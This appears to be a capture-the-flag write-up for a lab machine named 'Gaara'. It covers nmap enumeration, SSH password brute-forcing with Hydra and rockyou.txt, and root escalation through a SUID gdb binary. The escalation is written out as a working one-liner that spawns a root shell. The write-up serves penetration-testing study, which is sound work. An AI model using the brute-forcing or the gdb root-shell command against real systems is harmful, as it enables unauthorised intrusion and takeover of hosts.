# Gaara

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:b7:49:06:5c:75:96:11:1c:5a:6b:a0:87:a6:b6:e2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD2H1FcDrQJsXyp6B9ymm4Axg/xy3WaDrv/AjVSvmLZ2B1xTpHvNNrDxNTVwfOEXeXKPUORQO0PJvk3oya/F+e+gkJAPOaWPmtQjdmCNCi54KUq4TqJXU2eHwA3T5qWgW9iORjC88wqs9YjLz4Zllax0H2PlsuHAOXPVaJ8xhZmlappd+kTS2kL5uu29/D7xj6hAS84wo0CrpNlHfawNdi4lRqd9PICQgLHdm6Wu5hgtQrzDc0SHUtQoAPX0oXtz7lGw7rnMc2aGoZmYh04Dxy+IXDY4O8C+v+88Y7ODYoG54ZS9W5WP6SkiMM+rxR2kFhhiHTJbAqqOCI5l6QQ1a2z
|   256 ce:38:7e:f3:e3:5c:98:c8:a1:24:03:4b:0a:c4:a2:3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2v5n90LE189mmuGjGJHSHC5UuzJrpAGh8GlV1jqOkhjMasUA+B6rHpOVRc9VJzK9ed+l3kUbRFq6/Zdihbykw=
|   256 6a:44:3f:fe:8f:c2:b2:24:73:ec:03:bc:79:a1:74:b9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILmSRqPuajZrzh082mRrX1gEzysRWDe/mbxBAcB3wly2
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 - 3.13 (96%), Linux 4.15 (96%), Linux 5.0 - 5.14 (96%), Linux 5.14 - 6.8 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.10 - 4.11 (95%), Linux 2.6.32 - 3.5 (93%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=11/14%OT=22%CT=%CU=38058%PV=Y%DS=4%DC=T%G=N%TM=6AF885FB%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M540ST11NW7%O2=M540ST11NW7%O3=M540NNT11NW7%O4=M540ST11NW7%O5=M540ST11NW7%O6=M540ST11)
WIN(W1=FEF4%W2=FEF4%W3=FEF4%W4=FEF4%W5=FEF4%W6=FEF4)
ECN(R=Y%DF=Y%T=40%W=FC00%O=M540NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
```

### Port 80 - HTTP

During directory enumeration, I discovered a `/cryoserver` directory, though further inspection yielded no sensitive files or actionable leads

<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

### Credential brute forcing&#x20;

Finding no further leads on the web application, I shifted to credential brute-forcing against the SSH service. Using Hydra (or your preferred tool) with the `rockyou.txt` wordlist, I successfully recovered the password for the user `gaara` and gained SSH access

<figure><img src="../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

### Port 22 - SSH

<figure><img src="../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

&#x20;

### Privilege Escalation&#x20;

Enumerating SUID binaries revealed that `/usr/bin/gdb` had the SUID bit set. By leveraging a known GTFOBins Python payload (`gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`), I preserved the elevated effective UID (`euid=0`) to spawn a root shell.

```
Command:- gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

#### PoC - [https://gtfobins.org/gtfobins/gdb/](https://gtfobins.org/gtfobins/gdb/)

<figure><img src="../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>

